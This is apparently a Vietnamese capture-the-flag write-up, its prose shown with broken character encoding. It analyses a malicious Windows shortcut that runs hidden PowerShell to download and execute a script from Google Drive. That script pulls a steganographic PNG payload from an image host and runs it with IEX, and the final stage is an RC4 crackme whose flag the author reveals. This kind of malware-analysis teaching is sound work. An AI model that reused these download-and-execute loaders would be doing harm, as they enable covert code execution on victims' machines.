Nh√¨n v√†o file `ps` th√¨ t√¥i x√°c ƒë·ªãnh ƒë√¢y l√† m·ªôt shortcut. Th∆∞·ªùng m·ªôt s·ªë malware c≈©ng hay s·ª≠ d·ª•ng c√°ch n√†y ƒë·ªÉ download payload v·ªÅ. V√¨ v·∫≠y t√¥i s·∫Ω v√†o Property ƒë·ªÉ ki·ªÉm tra target c·ªßa n√≥.

```
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -w hidden -c "(New-Object Net.WebClient).DownloadString('https://drive.google.com/u/0/uc?id=1rzjAbtVnylBuOL4hSdp60fGZ24Od7DCV&export=download') | iex"
```

Ch√∫ng ta th·∫•y shortcut n√†y d√πng script c·ªßa Powershell ƒë·ªÉ download file v·ªÅ th·ª±c thi. T√¥i s·∫Ω download file v·ªÅ ƒë·ªÉ ph√¢n t√≠ch.

```
sal a New-Object;
Add-Type -A System.Drawing;
$g = a System.Drawing.Bitmap((a Net.WebClient).OpenRead("https://i.ibb.co/FmsX0Bx/payload.png"));
$o = a Byte[] 2221;
(0..0) | % {
   foreach ($x in (0..2220)) {
     $p = $g.GetPixel($x, $_);
     $o[$_ * 2221 + $x] = ([math]::Floor(($p.B -band 15) *  16) -bor ($p.G -band 15))
   }
};
IEX([System.Text.Encoding]::ASCII.GetString($o[0..1417]))
```

File download v·ªÅ c≈©ng l√† m·ªôt Powershell script, script n√†y th·ª±c hi·ªán vi·ªác download payload v·ªÅ, sau ƒë√≥ gi·∫£i m√£ payload ƒë√≥. Cu·ªëi c√πng s·∫Ω th·ª±c thi payload ƒë√≥.

ƒê·ªÉ c√≥ th·ªÉ ti·∫øp t·ª•c ph√¢n t√≠ch, t√¥i ƒë√£ s·ª≠a l·∫°i script nh∆∞ b√™n d∆∞·ªõi, sau ƒë√≥ upload l√™n drive, s·ª≠a l·∫°i link trong target c·ªßa shortcut v√† th·ª±c thi l·∫°i `ps` shortcut.

```
sal a New-Object;
Add-Type -A System.Drawing;
$g = a System.Drawing.Bitmap((a Net.WebClient).OpenRead("https://i.ibb.co/FmsX0Bx/payload.png"));
$o = a Byte[] 2221;
(0..0) | % {
   foreach ($x in (0..2220)) {
     $p = $g.GetPixel($x, $_);
     $o[$_ * 2221 + $x] = ([math]::Floor(($p.B -band 15) *  16) -bor ($p.G -band 15))
   }
};
[System.Text.Encoding]::ASCII.GetString($o[0..1417]) | Out-File -FilePath .\Payload.txt
```

Sau khi th·ª±c thi, ta c√≥ ƒë∆∞·ª£c file `Payload.txt`.

```
[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("JFI9eyRELCRLPSRBcmdzOyRTPTAuLjI1NTswLi4yNTV8JXskSj0oJEorJFNbJF9dKyRLWyRfJSRLLkxlbmd0aF0pJTI1NjskU1skX10sJFNbJEpdPSRTWyRKXSwkU1skX119OyREfCV7JEk9KCRJKzEpJTI1NjskSD0oJEgrJFNbJEldKSUyNTY7JFNbJEldLCRTWyRIXT0kU1skSF0sJFNbJEldOyRfLWJ4b3IkU1soJFNbJEldKyRTWyRIXSklMjU2XX19O1t2b2lkXVtSZWZsZWN0aW9uLkFzc2VtYmx5XTo6TG9hZFdpdGhQYXJ0aWFsTmFtZSgiTWljcm9zb2Z0LlZpc3VhbEJhc2ljIik7JEluID0gKFtzeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVURjgpLkdldEJ5dGVzKFtNaWNyb3NvZnQuVmlzdWFsQmFzaWMuSW50ZXJhY3Rpb25dOjpJbnB1dEJveCggIkVudGVyIGZsYWc6IiwiU2ltcGxlIENyYWNrbWUiKSk7W2J5dGVbXV0gJEsgPSAxMTksNzIsMTIxLDk1LDg5LDQ4LDExNyw5NSw5OCw4NSw0OSw0OSw4OSw5NSwxMDksNTE7W2J5dGVbXV0gJEQgPSA0OSw2Nyw1Nyw0OSw2NSw0OSw1Niw2Niw2Nyw2OCw0OCw1NSw1Niw1Miw3MCw1Myw1NCw1NSw1Niw2NSw1MCw1Nyw2OCw1NSw1MSw1NCw1Miw1MCw3MCw1Nyw2Niw1NSw2OCw2Nyw1Nyw1Nyw3MCw1NCw2NSw1MSw1Miw1NCw2Niw1Miw2OSw2OCw1MSw2Niw1MCw0OCw0OCw1Nyw2OCw2NSw1MSw2OCw1NSw1NSw2Nyw0OSw1NSw1MCw1NCw2Nyw1Niw2NTskViA9ICgmICRSICRJbiAkS3wgRm9yRWFjaC1PYmplY3QgeyAiezA6WDJ9IiAtZiAkXyB9KSAtam9pbiAnJztpZihbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpBU0NJSS5HZXRTdHJpbmcoJEQpIC1lcSAkVil7W01pY3Jvc29mdC5WaXN1YWxCYXNpYy5JbnRlcmFjdGlvbl06Ok1zZ0JveCgiQ29ycmVjdCEiLCAiT2tPbmx5LFN5c3RlbU1vZGFsLEluZm9ybWF0aW9uIiwgIlN1Y2Nlc3MiKX1lbHNle1tNaWNyb3NvZnQuVmlzdWFsQmFzaWMuSW50ZXJhY3Rpb25dOjpNc2dCb3goIkluY29ycmVjdCEiLCAiT2tPbmx5LFN5c3RlbU1vZGFsLEV4Y2xhbWF0aW9uIiwgIkVycm9yIil9")) | iex
```

Decode base64, ta ƒë∆∞·ª£c ƒëo·∫°n script nh∆∞ b√™n d∆∞·ªõi:

```
$R={       # RC4 function
	$D, $K = $Args;
	$S = 0..255;
	0..255 | %   # KSA
	{
		$J = ($J + $S[$_] + $K[$_ % $K.Length]) % 256;
		$S[$_], $S[$J] = $S[$J], $S[$_]           # swap
	};
	$D | %     # PRGA
	{ 
		$I = ($I + 1) % 256;
		$H = ($H + $S[$I]) % 256;
		$S[$I], $S[$H] = $S[$H], $S[$I];
		$_ -bxor $S[($S[$I] + $S[$H]) % 256]
	}
};

[void][Reflection.Assembly]::LoadWithPartialName("Microsoft.VisualBasic");

$In = ([system.Text.Encoding]::UTF8).GetBytes([Microsoft.VisualBasic.Interaction]::InputBox( "Enter flag:","Simple Crackme"));

[byte[]] $K = 119,72,121,95,89,48,117,95,98,85,49,49,89,95,109,51;
[byte[]] $D = 49,67,57,49,65,49,56,66,67,68,48,55,56,52,70,53,54,55,56,65,50,57,68,55,51,54,52,50,70,57,66,55,68,67,57,57,70,54,65,51,52,54,66,52,69,68,51,66,50,48,48,57,68,65,51,68,55,55,67,49,55,50,54,67,56,65;

$V = (& $R $In $K| ForEach-Object { "{0:X2}" -f $_ }) -join '';

if([System.Text.Encoding]::ASCII.GetString($D) -eq $V){
	[Microsoft.VisualBasic.Interaction]::MsgBox("Correct!", "OkOnly,SystemModal,Information", "Success")
}
else{
	[Microsoft.VisualBasic.Interaction]::MsgBox("Incorrect!", "OkOnly,SystemModal,Exclamation", "Error")
}
```

C√°ch ho·∫°t ƒë·ªông c·ªßa script s·∫Ω nh∆∞ sau:

- Bi·∫øn `$In` s·∫Ω ch·ª©a chu·ªói flag nh·∫≠p v√†o
- `InputBox( "Enter flag:","Simple Crackme"));` s·∫Ω m·ªü m·ªôt box ƒë·ªÉ ng∆∞·ªùi d√πng nh·∫≠p flag
- Bi·∫øn `$K` s·∫Ω l√† m·∫£ng key ƒë·ªÉ m√£ h√≥a flag
- Bi·∫øn `$D` s·∫Ω l√† m·∫£ng flag ƒë√£ b·ªã m√£ h√≥a
- `$V = (& $R $In $K| ForEach-Object { "{0:X2}" -f $_ }) -join '';` th·ª±c hi·ªán vi·ªác g·ªçi h√†m `$R` v·ªõi tham s·ªë l√† `$In` v√† `$K`. K·∫øt qu·∫£ tr·∫£ v·ªÅ c·ªßa h√†m s·∫Ω ƒë∆∞·ª£c chuy·ªÉn sang chu·ªói c√°c k√≠ t·ª± hexa v√† l∆∞u v√†o bi·∫øn `$V`
- `[System.Text.Encoding]::ASCII.GetString($D) -eq $V` d√πng ƒë·ªÉ so s√°nh bi·∫øn `$D` v√† `$V`
- H√†m `$R` l√† h√†m m√£ h√≥a **RC4**, v·ªõi `$D` l√† flag v√† `$K` l√† key

T·ªõi ƒë√¢y, t√¥i c√≥ th·ªÉ decrypt **RC4** v·ªõi `key=7748795f5930755f62553131595f6d33`, `enc=1C91A18BCD0784F5678A29D73642F9B7DC99F6A346B4ED3B2009DA3D77C1726C8A`.

Flag l√†: `KMA{----->fiL3L355_mALwar3<-----}`

